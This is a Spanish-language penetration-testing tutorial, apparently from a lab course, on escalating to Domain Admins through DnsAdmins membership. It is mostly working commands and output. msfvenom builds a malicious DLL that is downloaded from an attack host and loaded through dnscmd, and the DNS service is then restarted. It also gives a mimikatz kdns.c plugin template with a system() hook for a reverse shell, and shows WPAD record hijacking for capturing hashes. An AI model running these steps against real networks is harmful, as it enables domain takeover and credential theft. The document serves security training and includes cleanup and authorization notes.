# Leveraging DnsAdmins Access

## Generating Malicious DLL

Podemos generar una DLL maliciosa para agregar un usuario al grupo `domain admins` utilizando `msfvenom`.

```r
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 313 bytes
Final size of dll file: 5120 bytes
Saved as: adduser.dll
```

## Starting Local HTTP Server

Luego, inicia un servidor HTTP con Python.

```r
python3 -m http.server 7777

Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
10.129.43.9 - - [19/May/2021 19:22:46] "GET /adduser.dll HTTP/1.1" 200 -
```

## Downloading File to Target

Descarga el archivo en el objetivo.

```r
PS C:\htb>  wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
```

Veamos primero qué sucede si usamos la utilidad `dnscmd` para cargar una DLL personalizada con un usuario no privilegiado.

### Loading DLL as Non-Privileged User

```r
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

DNS Server failed to reset registry property.
    Status = 5 (0x00000005)
Command failed: ERROR_ACCESS_DENIED
```

Como era de esperar, intentar ejecutar este comando como un usuario normal no es exitoso. Solo los miembros del grupo `DnsAdmins` tienen permiso para hacer esto.

### Loading DLL as Member of DnsAdmins

```r
C:\htb> Get-ADGroupMember -Identity DnsAdmins

distinguishedName : CN=netadm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
name              : netadm
objectClass       : user
objectGUID        : 1a1ac159-f364-4805-a4bb-7153051a8c14
SamAccountName    : netadm
SID               : S-1-5-21-669053619-2741956077-1013132368-1109           
```

### Loading Custom DLL

Después de confirmar la membresía en el grupo `DnsAdmins`, podemos ejecutar nuevamente el comando para cargar una DLL personalizada.

```r
C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```

Nota: Debemos especificar la ruta completa a nuestra DLL personalizada o el ataque no funcionará correctamente.

Solo la utilidad `dnscmd` puede ser utilizada por los miembros del grupo `DnsAdmins`, ya que no tienen permiso directo en la clave del registro.

Con la configuración del registro que contiene la ruta de nuestro plugin malicioso configurada y nuestro payload creado, la DLL se cargará la próxima vez que se inicie el servicio DNS. La membresía en el grupo DnsAdmins no otorga la capacidad de reiniciar el servicio DNS, pero es algo que los administradores de sistemas podrían permitir a los administradores de DNS hacer.

Después de reiniciar el servicio DNS (si nuestro usuario tiene este nivel de acceso), deberíamos poder ejecutar nuestra DLL personalizada y agregar un usuario (en nuestro caso) o obtener una reverse shell. Si no tenemos acceso para reiniciar el servidor DNS, tendremos que esperar hasta que el servidor o el servicio se reinicie. Verifiquemos los permisos de nuestro usuario actual en el servicio DNS.

### Finding User's SID

Primero, necesitamos el SID de nuestro usuario.

```r
C:\htb> wmic useraccount where name="netadm" get sid

SID
S-1-5-21-669053619-2741956077-1013132368-1109
```

### Checking Permissions on DNS Service

Una vez que tengamos el SID del usuario, podemos usar el comando `sc` para verificar los permisos en el servicio. Según este [artículo](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/), podemos ver que nuestro usuario tiene permisos `RPWP` que se traducen a `SERVICE_START` y `SERVICE_STOP`, respectivamente.

```r
C:\htb> sc.exe sdshow DNS

D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
```

Consulta el módulo `Windows Fundamentals` para una explicación de la sintaxis SDDL en Windows.

### Stopping the DNS Service

Después de confirmar estos permisos, podemos emitir los siguientes comandos para detener y iniciar el servicio.

```r
C:\htb> sc stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x1
        WAIT_HINT          : 0x7530
```

El servicio DNS intentará iniciar y ejecutar nuestra DLL personalizada, pero si verificamos el estado, mostrará que no se pudo iniciar correctamente (más sobre esto más adelante).

### Starting the DNS Service

```r
C:\htb> sc start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 6960
        FLAGS              :
```

### Confirming Group Membership

Si todo va según lo planeado, nuestra cuenta se agregará al grupo Domain Admins o recibirá una reverse shell si nuestra DLL personalizada fue hecha para darnos una conexión de regreso.

```r
C:\htb> net group "Domain Admins" /dom

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            netadm
The command completed successfully.
```

## Cleaning Up

Realizar cambios de configuración y detener/iniciar el servicio DNS en un Domain Controller son acciones muy destructivas y deben realizarse con gran cuidado. Como penetration testers, debemos obtener la aprobación de nuestro cliente antes de proceder con esto, ya que podría potencialmente afectar el DNS para todo el entorno de Active Directory y causar muchos problemas. Si nuestro cliente da su permiso para continuar con este ataque, debemos ser capaces de cubrir nuestras huellas y limpiar después de nosotros o proporcionar a nuestro cliente pasos sobre cómo revertir los cambios.

Estos pasos deben tomarse desde una consola elevada con una cuenta de administrador local o de dominio.

### Confirming Registry Key Added

El primer paso es confirmar que la clave de registro `ServerLevelPluginDll` existe. Hasta que nuestra DLL personalizada sea eliminada, no podremos iniciar el servicio DNS nuevamente correctamente.

```r
C:\htb> reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters
    GlobalQueryBlockList    REG_MULTI_SZ    wpad\0isatap
    EnableGlobalQueryBlockList    REG_DWORD    0x1
    PreviousLocalHostname    REG_SZ    WINLPE-DC01.INLANEFREIGHT.LOCAL
    Forwarders    REG_MULTI_SZ    1.1.1.1\08.8.8.8
    ForwardingTimeout    REG_DWORD    0x3
    IsSlave    REG_DWORD    0x0
    BootMethod    REG_DWORD    0x3
    AdminConfigured    REG_DWORD    0x1
    ServerLevelPluginDll    REG_SZ    adduser.dll
```

### Deleting Registry Key

Podemos usar el comando `reg delete` para eliminar la clave que apunta a nuestra DLL personalizada.

```r
C:\htb> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll

Delete the registry value ServerLevelPluginDll (Yes/No)? Y
The operation completed successfully.
```

### Starting the DNS Service Again

Una vez hecho esto, podemos iniciar el servicio DNS nuevamente.

```r
C:\htb> sc.exe start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 4984
        FLAGS              :
```

### Checking DNS Service Status

Si todo salió según lo planeado, consultar el servicio DNS mostrará que está en funcionamiento. También podemos confirmar que el DNS funciona correctamente dentro del entorno realizando un `nslookup` contra el localhost u otro host en el dominio.

```r
C:\htb> sc query dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

Nuevamente, este es un ataque potencialmente destructivo que solo debemos realizar con el permiso explícito y en coordinación con nuestro cliente. Si ellos comprenden los riesgos y desean ver una prueba de concepto completa, los pasos descritos en esta sección ayudarán a demostrar el ataque y limpiar después.

## Using Mimilib.dll

Como se detalla en este [post](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html), también podríamos utilizar [mimilib.dll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) del creador de la herramienta `Mimikatz` para obtener ejecución de comandos modificando el archivo [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) para ejecutar un reverse shell one-liner u otro comando de nuestra elección.

```r
/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginCleanup()
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
	FILE * kdns_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
	{
		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
		fclose(kdns_logfile);
	    system("ENTER COMMAND HERE");
	}
	return ERROR_SUCCESS;
}
```

## Creating a WPAD Record

Otra forma de abusar de los privilegios del grupo DnsAdmins es creando un registro WPAD. La membresía en este grupo nos da los derechos para [disable global query block security](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps), que por defecto bloquea este ataque. Server 2008 introdujo por primera vez la capacidad de agregar a una lista de bloqueo de consultas globales en un servidor DNS. Por defecto, Web Proxy Automatic Discovery Protocol (WPAD) e Intra-site Automatic Tunnel Addressing Protocol (ISATAP) están en la lista de bloqueo de consultas globales. Estos protocolos son bastante vulnerables al secuestro, y cualquier usuario del dominio puede crear un objeto de computadora o un registro DNS que contenga esos nombres.

Después de deshabilitar la lista de bloqueo de consultas globales y crear un registro WPAD, cada máquina que ejecute WPAD con la configuración predeterminada tendrá su tráfico redirigido a través de nuestra máquina de ataque. Podríamos usar una herramienta como [Responder](https://github.com/lgandx/Responder) o [Inveigh](https://github.com/Kevin-Robertson/Inveigh) para realizar suplantación de tráfico e intentar capturar hashes de contraseñas y descifrarlos fuera de línea o realizar un ataque SMBRelay.

### Disabling the Global Query Block List

Para configurar este ataque, primero deshabilitamos la lista de bloqueo de consultas globales:

```r
C:\htb> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

### Adding a WPAD Record

Luego, agregamos un registro WPAD apuntando a nuestra máquina de ataque.

```r
C:\htb> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local
```